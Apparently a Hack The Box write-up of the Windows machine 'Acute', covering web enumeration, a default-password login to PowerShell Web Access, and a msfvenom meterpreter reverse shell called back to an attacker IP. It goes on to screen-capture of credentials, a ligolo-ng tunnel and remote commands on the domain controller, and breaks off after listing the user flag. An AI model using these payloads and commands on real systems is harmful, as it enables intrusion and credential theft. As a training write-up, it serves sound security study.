@@ -1,0 +1,374 @@
+<!DOCTYPE html>
+<html lang="en"><head><meta charset="UTF-8" /><meta name="viewport" content="width=device-width, initial-scale=1.0" /><title>Acute | Paracausal Telemetry</title><meta name="description" content="Hard Hack The Box Active Directory machine, written up by Ethan Bauer. Covers HTTPS (443), Access to PSWA, PWSA Enumeration." /><meta name="robots" content="index,follow" /><meta name="theme-color" content="#0a0b0c" /><meta name="referrer" content="strict-origin-when-cross-origin" /><link rel="canonical" href="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-acute/" /><meta property="og:type" content="article" /><meta property="og:site_name" content="Paracausal Telemetry" /><meta property="og:title" content="Acute" /><meta property="og:description" content="Hard Hack The Box Active Directory machine, written up by Ethan Bauer. Covers HTTPS (443), Access to PSWA, PWSA Enumeration." /><meta property="og:url" content="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-acute/" /><meta property="og:image" content="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-acute/og.png?v=8c5b2c48" /><meta property="og:image:width" content="1200" /><meta property="og:image:height" content="630" /><meta name="twitter:card" content="summary_large_image" /><meta name="twitter:title" content="Acute" /><meta name="twitter:description" content="Hard Hack The Box Active Directory machine, written up by Ethan Bauer. Covers HTTPS (443), Access to PSWA, PWSA Enumeration." /><meta name="twitter:image" content="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-acute/og.png?v=8c5b2c48" /><link rel="icon" type="image/svg+xml" href="/src/favicon.svg?v=5" /><link rel="preload" as="font" type="font/woff2" href="/src/fonts/geist-var.woff2" crossorigin /><link rel="preload" as="font" type="font/woff2" href="/src/fonts/space-grotesk-var.woff2" crossorigin /><link rel="stylesheet" href="/styles.css?v=276fa973-site9" /><style>.writeup-article{max-width:var(--container-narrow,52rem);margin:0 auto}.writeup-article-head{margin:0 0 2rem}.writeup-meta{display:flex;flex-wrap:wrap;gap:0.5rem;margin:1.2rem 0 0}.writeup-chip{border:1px solid var(--line-strong);color:var(--muted);font:600 0.72rem/1 var(--font-mono,ui-monospace,monospace);letter-spacing:0.06em;padding:0.35rem 0.55rem;text-transform:uppercase}.writeup-chip-tag{text-transform:none;letter-spacing:0}.writeup-sources{display:flex;flex-wrap:wrap;gap:1.2rem;margin:1rem 0 0;font-size:0.82rem}.writeup-sources a,.writeup-article-footer a{display:inline-flex;align-items:center;min-height:24px}.writeup-article-footer{border-top:1px solid var(--line);margin:2.5rem 0 0;padding:1.2rem 0 0}.writeup-page-pager{margin:0 0 1.2rem}</style><script type="application/ld+json">{"@context":"https://schema.org","@graph":[{"@type":"TechArticle","headline":"Acute","description":"Hard Hack The Box Active Directory machine, written up by Ethan Bauer. Covers HTTPS (443), Access to PSWA, PWSA Enumeration.","url":"https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-acute/","datePublished":"2026-10-20","keywords":"Hack The Box, Active Directory, Windows","author":{"@type":"Organization","name":"Paracausal Telemetry","url":"https://paracausaltelemetry.com/"}},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://paracausaltelemetry.com/"},{"@type":"ListItem","position":2,"name":"Writeups","item":"https://paracausaltelemetry.com/writeups/"},{"@type":"ListItem","position":3,"name":"Acute","item":"https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-acute/"}]}]}</script></head><body><script>(function(){try{var m=document.cookie.match(/(?:^|;\s*)pt_theme=(light|dark)/);var t=m?m[1]:localStorage.getItem("theme");var d=window.matchMedia("(prefers-color-scheme: dark)").matches;if(t==="light"||(!t&&!d))document.body.classList.add("light-mode");}catch(e){}})();</script><a class="skip-to-content" href="#writeup">Skip to writeup</a><div class="page-shell"><header class="site-header" data-site-header><a class="brand" href="/" aria-label="Back to home"><span class="brand-mark" aria-hidden="true"><svg viewBox="0 0 48 48" focusable="false"><circle cx="24" cy="24" r="19" class="brand-radar-ring"></circle><circle cx="24" cy="24" r="11.5" class="brand-radar-ring brand-radar-ring-inner"></circle><path d="M24 5V43M5 24H43" class="brand-radar-grid"></path><g class="brand-radar-sweep"><rect class="brand-radar-trail" x="28" y="18.2" width="1.8" height="1.8" opacity="0.54"></rect><rect class="brand-radar-trail" x="30.5" y="15.7" width="1.8" height="1.8" opacity="0.68"></rect><rect class="brand-radar-trail" x="33" y="13.2" width="1.8" height="1.8" opacity="0.54"></rect><rect class="brand-radar-trail" x="35.5" y="10.7" width="1.8" height="1.8" opacity="0.68"></rect><rect class="brand-radar-trail" x="35.5" y="13.2" width="1.8" height="1.8" opacity="0.31"></rect><rect class="brand-radar-trail" x="33" y="15.7" width="1.8" height="1.8" opacity="0.21"></rect><rect class="brand-radar-trail" x="30.5" y="18.2" width="1.8" height="1.8" opacity="0.24"></rect><rect class="brand-radar-trail" x="38" y="13.2" width="1.8" height="1.8" opacity="0.33"></rect><rect class="brand-radar-trail" x="35.5" y="15.7" width="1.8" height="1.8" opacity="0.36"></rect><rect class="brand-radar-trail" x="33" y="18.2" width="1.8" height="1.8" opacity="0.22"></rect><rect class="brand-radar-trail" x="38" y="15.7" width="1.8" height="1.8" opacity="0.12"></rect><rect class="brand-radar-trail" x="35.5" y="18.2" width="1.8" height="1.8" opacity="0.12"></rect><rect class="brand-radar-trail" x="30.5" y="20.7" width="1.8" height="1.8" opacity="0.14"></rect><rect class="brand-radar-trail" x="38" y="18.2" width="1.8" height="1.8" opacity="0.12"></rect><path class="brand-radar-beam" d="M24 24L36.2 9.4"></path></g><circle cx="24" cy="24" r="2.6" class="brand-radar-core"></circle><circle cx="39" cy="20.5" r="2.8" class="brand-radar-blip"></circle></svg></span><span class="brand-copy"><strong id="brand-name">Paracausal Telemetry</strong><small id="brand-role">Writeups</small></span></a><a class="site-menu-toggle" href="#site-menu"><span>Menu</span><svg viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path d="M4 7h16M4 12h16M4 17h16" /></svg></a><div class="header-actions" id="site-menu" data-site-menu><nav class="site-nav" aria-label="Primary navigation"><a href="/">Home</a><a href="/writeups/" aria-current="page">Writeups</a><a href="/cpts/">CPTS</a><a href="/links/">Links</a><a href="/#talks">Talks</a><a href="https://alchemist.paracausaltelemetry.com/" aria-label="Alchemist (opens the separate Alchemist app)">Alchemist<svg class="nav-external" viewBox="0 0 12 12" aria-hidden="true" focusable="false"><path d="M4 2h6v6M10 2 3 9"/></svg></a></nav><button class="theme-toggle" id="theme-toggle" type="button" aria-label="Toggle light and dark mode"><svg class="theme-icon theme-icon-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="4"/><path d="M12 2v2"/><path d="M12 20v2"/><path d="m4.93 4.93 1.41 1.41"/><path d="m17.66 17.66 1.41 1.41"/><path d="M2 12h2"/><path d="M20 12h2"/><path d="m6.34 17.66-1.41 1.41"/><path d="m19.07 4.93-1.41 1.41"/></svg><svg class="theme-icon theme-icon-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/></svg></button></div></header><main id="writeup" class="learn-library-main"><nav class="learn-breadcrumbs" aria-label="Breadcrumb"><a href="/">Home</a><span>/</span><a href="/writeups/">Writeups</a><span>/</span><span aria-current="page">Acute</span></nav><article class="writeup-article"><header class="writeup-article-head"><p class="eyebrow">Hack The Box · 2026-10-20 · 16 min read</p><h1>Acute</h1><p>Hard Hack The Box Active Directory machine, written up by Ethan Bauer. Covers HTTPS (443), Access to PSWA, PWSA Enumeration.</p><div class="writeup-meta"><span class="writeup-chip">Difficulty · hard</span><span class="writeup-chip writeup-chip-os"><svg class="os-icon os-icon-windows" viewBox="0 0 24 24" width="16" height="16" fill="currentColor" aria-hidden="true" focusable="false"><path d="M0 3.45 9.75 2.1v9.4H0zm10.95-1.5L24 0v11.4H10.95zM0 12.6h9.75V22L0 20.65zm10.95 0H24V24l-13.05-1.8z"/></svg>OS · Windows</span><span class="writeup-chip writeup-chip-tag">Hack The Box</span><span class="writeup-chip writeup-chip-tag">Active Directory</span><span class="writeup-chip writeup-chip-tag">Windows</span></div><p class="writeup-sources"><a href="https://app.hackthebox.com/machines/Acute" rel="noreferrer" target="_blank">Original room</a><a href="https://github.com/paracausaltelemetry/CTF-Writeups/blob/main/HTB/ethan-bauer/htb-acute.md" rel="noreferrer" target="_blank">Source markdown</a></p></header><section class="room-card" aria-label="Hack The Box machine details"><div class="room-card-head room-card-has-icon"><img src="/writeups/meta/htb/machine-acute.webp" width="56" height="56" alt="" loading="lazy" decoding="async" /><div class="room-card-title"><p class="eyebrow">Hack The Box machine</p><h2>Acute</h2><p>Acute is a hard Windows machine that starts with a website on port 443. The certificate of the website reveals a domain name atsserver.acute.local. Looking around the website there are several employees mentioned and with this information it is possible to construct a list of…</p></div><span class="room-badge room-badge-hard">Hard</span></div><dl class="room-facts"><div><dt>Released</dt><dd>12 Feb 2022</dd></div><div><dt>Retired</dt><dd>Yes</dd></div><div><dt>OS</dt><dd class="room-os"><svg class="os-icon os-icon-windows" viewBox="0 0 24 24" width="16" height="16" fill="currentColor" aria-hidden="true" focusable="false"><path d="M0 3.45 9.75 2.1v9.4H0zm10.95-1.5L24 0v11.4H10.95zM0 12.6h9.75V22L0 20.65zm10.95 0H24V24l-13.05-1.8z"/></svg><span>Windows</span></dd></div><div><dt>Creator</dt><dd>dmw0ng</dd></div><div><dt>Rating</dt><dd>4.5 / 5</dd></div><div><dt>User owns</dt><dd>1,599</dd></div><div><dt>Root owns</dt><dd>1,345</dd></div><div><dt>User blood</dt><dd>xct<small class="room-blood-time">1H 20M 24S</small></dd></div><div><dt>Root blood</dt><dd>jazzpizazz<small class="room-blood-time">4H 29M 58S</small></dd></div></dl><div class="room-charts"><figure class="room-chart"><figcaption>Rated difficulty</figcaption><svg viewBox="0 0 254 64" role="img" aria-label="Player-rated difficulty, 1610 votes from easiest to hardest"><rect x="0" y="59" width="20" height="5" rx="2" fill="hsl(96 70% 55%)"><title>35 votes</title></rect><rect x="26" y="62" width="20" height="2" rx="2" fill="hsl(96 70% 55%)"><title>13 votes</title></rect><rect x="52" y="59" width="20" height="5" rx="2" fill="hsl(80 70% 55%)"><title>40 votes</title></rect><rect x="78" y="53" width="20" height="11" rx="2" fill="hsl(70 70% 55%)"><title>87 votes</title></rect><rect x="104" y="26" width="20" height="38" rx="2" fill="hsl(50 70% 55%)"><title>286 votes</title></rect><rect x="130" y="30" width="20" height="34" rx="2" fill="hsl(38 70% 55%)"><title>255 votes</title></rect><rect x="156" y="0" width="20" height="64" rx="2" fill="hsl(28 70% 55%)"><title>486 votes</title></rect><rect x="182" y="29" width="20" height="35" rx="2" fill="hsl(16 70% 55%)"><title>262 votes</title></rect><rect x="208" y="54" width="20" height="10" rx="2" fill="hsl(8 70% 55%)"><title>74 votes</title></rect><rect x="234" y="55" width="20" height="9" rx="2" fill="hsl(0 70% 55%)"><title>72 votes</title></rect></svg></figure><figure class="room-chart room-radar"><figcaption>Player profile</figcaption><svg viewBox="-60 0 340 230" role="img" aria-label="Radar graph out of 10: Enumeration 7.7, Real-Life 7.1, CVE 5.1, Custom Exploitation 4.9, CTF-Like 2.9"><polygon points="110.0,92.5 126.6,104.6 120.3,124.2 99.7,124.2 93.4,104.6" class="radar-ring"/><polygon points="110.0,75.0 143.3,99.2 130.6,138.3 89.4,138.3 76.7,99.2" class="radar-ring"/><polygon points="110.0,57.5 159.9,93.8 140.9,152.5 79.1,152.5 60.1,93.8" class="radar-ring"/><polygon points="110.0,40.0 176.6,88.4 151.1,166.6 68.9,166.6 43.4,88.4" class="radar-ring"/><line x1="110" y1="110" x2="110.0" y2="40.0" class="radar-ring"/><line x1="110" y1="110" x2="176.6" y2="88.4" class="radar-ring"/><line x1="110" y1="110" x2="151.1" y2="166.6" class="radar-ring"/><line x1="110" y1="110" x2="68.9" y2="166.6" class="radar-ring"/><line x1="110" y1="110" x2="43.4" y2="88.4" class="radar-ring"/><polygon points="110.0,56.1 157.3,94.6 131.0,138.9 89.8,137.7 90.7,103.7" class="radar-shape"/><text x="110.0" y="25.8" text-anchor="middle">Enumeration</text><text x="193.9" y="86.7" text-anchor="start">Real-Life</text><text x="161.8" y="185.4" text-anchor="start">CVE</text><text x="58.2" y="185.4" text-anchor="end">Custom Exploitation</text><text x="26.1" y="86.7" text-anchor="end">CTF-Like</text></svg></figure></div><p class="room-link"><a href="https://app.hackthebox.com/machines/Acute" rel="noreferrer" target="_blank">Open on Hack The Box<span class="visually-hidden"> (opens in a new tab)</span></a></p></section><div class="markdown-body"><h2>Enumeration</h2><h3>Open ports</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ nmap -p- --min-rate=2000 -sT -Pn 10.129.136.40 -vv
+
+Nmap scan report for 10.129.136.40
+Host is up, received user-set (0.020s latency).
+Scanned at 2026-10-20 16:09:47 BST for 66s
+Not shown: 65534 filtered tcp ports (no-response)
+PORT    STATE SERVICE REASON
+443/tcp open  https   syn-ack
+
+Read data files from: /usr/share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 66.25 seconds</code></pre><h3>Nmap</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ nmap -p 443 -A --min-rate=2000 -sT -Pn 10.129.136.40
+Starting Nmap 7.991 ( https://nmap.org ) at 2026-10-20 16:11 +0100
+Nmap scan report for 10.129.136.40
+Host is up (0.013s latency).
+
+PORT    STATE SERVICE    VERSION
+443/tcp open  ssl/https?
+|_ssl-date: 2026-10-20T15:13:17+00:00; 0s from scanner time.
+| ssl-cert: Subject: commonName=atsserver.acute.local
+| Subject Alternative Name: DNS:atsserver.acute.local, DNS:atsserver
+| Not valid before: 2022-01-06T06:34:58
+|_Not valid after:  2030-01-04T06:34:58
+| tls-alpn: 
+|   h2
+|_  http/1.1
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
+OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
+Aggressive OS guesses: Microsoft Windows Server 2019 (97%), Microsoft Windows 10 1903 - 22H2 (91%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops</code></pre><p>Only a web service open</p><p><code>atsserver.acute.local</code> ill add to <code>/etc/hosts</code></p><h2>HTTPS (443)</h2><p><img src="images/acute/pasted-image-20261020161640.webp" alt="Screenshot" loading="lazy" /></p><p>Im running this through my proxy and im seeing wordpress endpoints</p><p>There is a docx i can download</p><p><img src="images/acute/pasted-image-20261020162900.webp" alt="Screenshot" loading="lazy" /></p><p>This docx file reveals a potential user <code>lois</code></p><p><img src="images/acute/pasted-image-20261020163036.webp" alt="Screenshot" loading="lazy" /></p><p><img src="images/acute/pasted-image-20261020164633.webp" alt="Screenshot" loading="lazy" /></p><p>There is what looks like a default password</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">Password1!</code></pre><p><img src="images/acute/pasted-image-20261020163124.webp" alt="Screenshot" loading="lazy" /></p><p>In the document there is also a hyperlink to <code>https://atsserver.acute.local/Acute_Staff_Access/</code></p><p><img src="images/acute/pasted-image-20261020163334.webp" alt="Screenshot" loading="lazy" /></p><p>This takes me to an interesting login page</p><p>There is no option to register</p><p><img src="images/acute/pasted-image-20261020163430.webp" alt="Screenshot" loading="lazy" /></p><p>There is also more connection options</p><p><img src="images/acute/pasted-image-20261020163730.webp" alt="Screenshot" loading="lazy" /></p><p>There is also some more potential users on the about page</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">aileen wallace
+charlotte hall
+evan davies
+ieuan monks
+joshua morgan
+lois hopkins</code></pre><p>Ill try the default password with some of the users on the login form</p><p>Attempting auth on several different users, but the user <code>edavies</code> gives a different error</p><p><img src="images/acute/pasted-image-20261020165600.webp" alt="Screenshot" loading="lazy" /></p><p>This tells me the credentials are valid, but the connection endpoint is unauthorized</p><h2>Access to PSWA </h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ exiftool New_Starter_CheckList_v7.docx                  
+ExifTool Version Number         : 13.55
+File Name                       : New_Starter_CheckList_v7.docx
+Directory                       : .
+File Size                       : 35 kB
+File Modification Date/Time     : 2026:10:20 16:19:39+01:00
+File Access Date/Time           : 2026:10:20 16:19:54+01:00
+File Inode Change Date/Time     : 2026:10:20 16:19:47+01:00
+File Permissions                : -rw-rw-r--
+File Type                       : DOCX
+File Type Extension             : docx
+MIME Type                       : application/vnd.openxmlformats-officedocument.wordprocessingml.document
+Zip Required Version            : 20
+Zip Bit Flag                    : 0x0006
+Zip Compression                 : Deflated
+Zip Modify Date                 : 1980:01:01 00:00:00
+Zip CRC                         : 0x079b7eb2
+Zip Compressed Size             : 428
+Zip Uncompressed Size           : 2527
+Zip File Name                   : [Content_Types].xml
+Creator                         : FCastle
+Description                     : Created on Acute-PC01
+Last Modified By                : Daniel
+Revision Number                 : 8
+Last Printed                    : 2021:01:04 15:54:00Z
+Create Date                     : 2021:12:08 14:21:00Z
+Modify Date                     : 2021:12:22 00:39:00Z
+Template                        : Normal.dotm
+Total Edit Time                 : 2.6 hours
+Pages                           : 3
+Words                           : 886
+Characters                      : 5055
+Application                     : Microsoft Office Word
+Doc Security                    : None
+Lines                           : 42
+Paragraphs                      : 11
+Scale Crop                      : No
+Heading Pairs                   : Title, 1
+Titles Of Parts                 : 
+Company                         : University of Marvel
+Links Up To Date                : No
+Characters With Spaces          : 5930
+Shared Doc                      : No
+Hyperlinks Changed              : No
+App Version                     : 16.0000</code></pre><p>So after realizing the creds are valid but what im trying to connect to isnt, i return to enumeration</p><p>Getting the metadata of the pdf file gives me two things, <code>fcastle</code> is a user, and the computer name <code>acute-pc01</code></p><p><img src="images/acute/pasted-image-20261020170128.webp" alt="Screenshot" loading="lazy" /></p><p>I now am able to login</p><h2>PWSA Enumeration</h2><p><img src="images/acute/pasted-image-20261020170407.webp" alt="Screenshot" loading="lazy" /></p><p>This isnt running in constrained language mode</p><p><img src="images/acute/pasted-image-20261020171302.webp" alt="Screenshot" loading="lazy" /></p><p>These are the users with a profile</p><p><img src="images/acute/pasted-image-20261020172023.webp" alt="Screenshot" loading="lazy" /></p><p>There is a directory setup as a defender exclusion</p><p>This is good to know if i need to do any tunneling at any point</p><p><img src="images/acute/pasted-image-20261020172434.webp" alt="Screenshot" loading="lazy" /></p><p><code>22.1</code> is the webserver</p><p>I am currently remoted into <code>22.2</code></p><p><img src="images/acute/pasted-image-20261020172633.webp" alt="Screenshot" loading="lazy" /></p><p>Ill query the users with an active logon, i dont think this is me, although im running as <code>edavies</code> this looks to be a different logon type</p><p>A console session is a direct session, so in other words the user is actually sitting at the machine, so this cant be me, as im remoted in</p><p>In order to see what the user is doing in this session, it might be a good idea to upload a beacon to the target and place it in utils then i can monitor the session</p><h2>Meterpreter session </h2><p>I think this active session is interesting and if i remember correctly meterpreter has a built in option to watch the screen</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.61 LPORT=1337 -f exe -o shell.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of exe file: 7680 bytes
+Saved as: shell.exe</code></pre><p>Ill create a shell</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</code></pre><p>Ill start a webserver to host it</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ msfconsole
+
+msf &gt; use exploit/multi/handler 
+
+msf exploit(multi/handler) &gt; set LHOST tun0
+LHOST =&gt; 10.10.14.61
+msf exploit(multi/handler) &gt; set LPORT 1337
+LPORT =&gt; 1337
+msf exploit(multi/handler) &gt; set payload windows/x64/meterpreter_reverse_tcp</code></pre><p>Ill set all the correct options that were set in msfvenom and then run with listener with <code>run</code></p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">wget http://10.10.14.61/shell.exe -o shell.exe</code></pre><p>In the PWSA session ill use this command to get the shell</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">./shell.exe</code></pre><p>Then ill just run it</p><p><img src="images/acute/pasted-image-20261022163257.webp" alt="Screenshot" loading="lazy" /></p><p>I now have a meterpreter session</p><p>Using the screenshare function i can capture the credentials</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">imonks:W3_4R3_th3_f0rce.</code></pre><p>I have the credentials</p><h2>Setting up ligolo-ng on the target</h2><p>I now have credentials, but i still cannot reach the internal network</p><p>Ill download both the linux proxy and the windows agent from the github releases</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</code></pre><p>Ill start a web server on my machine</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">PS C:\Utils&gt; wget http://10.10.14.61/agent.exe -o agent.exe</code></pre><p>Ill drop into a shell from my meterpreter session, then download the agent</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ sudo ./proxy -selfcert                                       
+[sudo] password for kali: 
+INFO[0000] Loading configuration file ligolo-ng.yaml    
+WARN[0000] daemon configuration file not found. Creating a new one... 
+? Enable Ligolo-ng WebUI? No
+WARN[0000] Using default selfcert domain &#39;ligolo&#39;, beware of CTI, SOC and IoC! 
+ERRO[0000] Certificate cache error: acme/autocert: certificate cache miss, returning a new certificate 
+INFO[0000] Listening on 0.0.0.0:11601                   
+    __    _             __                       
+   / /   (_)___ _____  / /___        ____  ____ _
+  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/
+ / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ / 
+/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /  
+        /____/                          /____/   
+
+  Made in France ♥            by @Nicocha30!
+  Version: 0.9.2
+
+ligolo-ng »  </code></pre><p>Ill then start the proxy on my machine</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">PS C:\Utils&gt; .\agent.exe -connect 10.10.14.61:11601 --retry --ignore-cert
+.\agent.exe -connect 10.10.14.61:11601 --retry --ignore-cert
+time=&quot;2026-10-22T17:09:26+01:00&quot; level=warning msg=&quot;warning, certificate validation disabled&quot;
+time=&quot;2026-10-22T17:09:26+01:00&quot; level=info msg=&quot;Connection established&quot; addr=&quot;10.10.14.61:11601&quot;</code></pre><p>Ill trigger the connection</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">[Agent : ACUTE\edavies@Acute-PC01] » ifcreate --name ligolo
+INFO[0108] Creating a new ligolo interface...           
+INFO[0108] Interface created!</code></pre><p>Ill select the new session, then create a new interface</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">[Agent : ACUTE\edavies@Acute-PC01] » ifconfig
+┌───────────────────────────────────────────────┐
+│ Interface 0                                   │
+├──────────────┬────────────────────────────────┤
+│ Name         │ Ethernet 2                     │
+│ Hardware MAC │ 00:15:5d:e8:0a:01              │
+│ MTU          │ 1500                           │
+│ Flags        │ up|broadcast|multicast|running │
+│ IPv6 Address │ fe80::9513:4361:23ec:64fd/64   │
+│ IPv4 Address │ 172.16.22.2/24                 │
+└──────────────┴────────────────────────────────┘
+┌──────────────────────────────────────────────┐
+│ Interface 1                                  │
+├──────────────┬───────────────────────────────┤
+│ Name         │ Loopback Pseudo-Interface 1   │
+│ Hardware MAC │                               │
+│ MTU          │ -1                            │
+│ Flags        │ up|loopback|multicast|running │
+│ IPv6 Address │ ::1/128                       │
+│ IPv4 Address │ 127.0.0.1/8                   │
+└──────────────┴───────────────────────────────┘
+[Agent : ACUTE\edavies@Acute-PC01] »  </code></pre><p>Ill make note of the internal IP address <code>172.16.22.2/24</code></p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">[Agent : ACUTE\edavies@Acute-PC01] » route_add --name ligolo --route 172.16.22.0/24
+INFO[0204] Route created.                               
+[Agent : ACUTE\edavies@Acute-PC01] » tunnel_start 
+INFO[0209] Starting tunnel to ACUTE\edavies@Acute-PC01 (00155de80a01) 
+[Agent : ACUTE\edavies@Acute-PC01] » </code></pre><p>Then ill use the IP to add routing info to the created interface then start the tunnel</p><p>Now this is setup i should be able to access <code>.1</code> which is the <code>ATSSERVER</code> and <code>.2</code> which is the <code>acute-pc01</code></p><h2>Nmap on ATSSERVER</h2><p>I have already scanned this at the start but only port 443 was open externally</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ nmap -p- -sT -Pn 172.16.22.1 -vv 
+
+Starting Nmap 7.991 ( https://nmap.org ) at 2026-10-22 17:15 +0100
+Initiating Parallel DNS resolution of 1 host. at 17:15
+Completed Parallel DNS resolution of 1 host. at 17:15, 0.50s elapsed
+Initiating Connect Scan at 17:15
+Scanning 172.16.22.1 [65535 ports]
+Discovered open port 53/tcp on 172.16.22.1
+Discovered open port 445/tcp on 172.16.22.1
+Discovered open port 135/tcp on 172.16.22.1
+Discovered open port 139/tcp on 172.16.22.1
+Discovered open port 443/tcp on 172.16.22.1
+Discovered open port 3268/tcp on 172.16.22.1
+Connect Scan Timing: About 15.05% done; ETC: 17:18 (0:02:55 remaining)
+Discovered open port 464/tcp on 172.16.22.1
+Discovered open port 88/tcp on 172.16.22.1
+Connect Scan Timing: About 30.20% done; ETC: 17:18 (0:02:34 remaining)
+Discovered open port 49692/tcp on 172.16.22.1
+Discovered open port 49691/tcp on 172.16.22.1
+Discovered open port 9389/tcp on 172.16.22.1
+Discovered open port 49902/tcp on 172.16.22.1
+Discovered open port 636/tcp on 172.16.22.1
+Discovered open port 2179/tcp on 172.16.22.1
+Discovered open port 389/tcp on 172.16.22.1
+Discovered open port 49668/tcp on 172.16.22.1
+Connect Scan Timing: About 48.38% done; ETC: 17:19 (0:02:17 remaining)
+Discovered open port 593/tcp on 172.16.22.1
+Discovered open port 3269/tcp on 172.16.22.1
+Discovered open port 51011/tcp on 172.16.22.1</code></pre><p>Judging from the verbose output this is a domain controller</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">172.16.22.1	atsserver.acute.local acute.local atsserver
+172.16.22.2	acute-pc01.acute.local acute-pc01</code></pre><p>Ill update my hosts file</p><h2>Domain enumeration</h2><p>Now i can reach the DC ill enumerate the domain</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ nxc smb atsserver.acute.local -u imonks -p &#39;W3_4R3_th3_f0rce.&#39; -k
+SMB         atsserver.acute.local 445    atsserver        [*]  x64 (name:atsserver) (domain:acute.local) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         atsserver.acute.local 445    atsserver        [+] acute.local\imonks:W3_4R3_th3_f0rce. </code></pre><p>The creds found earlier i can auth, NTLM is disabled!</p><p>There are only default shares</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ nxc smb atsserver.acute.local -u imonks -p &#39;W3_4R3_th3_f0rce.&#39; -k --rid-brute 20000 | grep SidTypeUser | cut -d &#39;\&#39; -f 2 | cut -d &#39; &#39; -f 1 | tee users.txt
+Administrator
+Guest
+krbtgt
+ATSSERVER$
+MARVEL-PC01$
+awallace
+chall
+edavies
+imonks
+jmorgan
+lhopkins
+ACUTE-PC01$</code></pre><p>Ill get all the users using <code>--rid-brute</code> to also get machine accounts</p><p>There is also no lockout policy</p><p>There also isnt much in bloodhound</p><h2>Command execution on <code>ATSSERVER</code> from <code>Acute-PC01</code></h2><p>Since my meterpreter session is busy running the ligolo agennt ill open a winrm session on <code>acute-pc01</code> as <code>edavies</code></p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">evil-winrm-py PS C:\Users\edavies\Documents&gt; $pass = ConvertTo-SecureString &quot;W3_4R3_th3_f0rce.&quot; -AsPlainText -Force
+evil-winrm-py PS C:\Users\edavies\Documents&gt; $cred = New-Object System.Management.Automation.PSCredential(&quot;ACUTE\imonks&quot;, $pass)</code></pre><p>Ill create another credential object for <code>imonks</code></p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">evil-winrm-py PS C:\Users\edavies\Documents&gt; Invoke-Command -ComputerName ATSSERVER -ScriptBlock {whoami} -Credential $cred -ConfigurationName dc_manage
+acute\imonks</code></pre><p>Ill use the credential object to run a command as that user on the ATSSERVER</p><p>I used <code>dc_manage</code> because this was what <code>edavies</code> was using when i captured his credentials in the powershell session</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">evil-winrm-py PS C:\Users\edavies\Documents&gt; Invoke-Command -ComputerName ATSSERVER -ScriptBlock {ls C:\Users\imonks\Desktop} -Credential $cred -ConfigurationName dc_manage
+
+
+    Directory: C:\Users\imonks\Desktop
+
+
+Mode                 LastWriteTime         Length Name                                PSComputerName                    
+----                 -------------         ------ ----                                --------------                    
+-ar---        10/22/2026   4:24 PM             34 user.txt                            ATSSERVER                         
+-a----         1/11/2022   6:04 PM            602 wm.ps1                              ATSSERVER                         
+
+
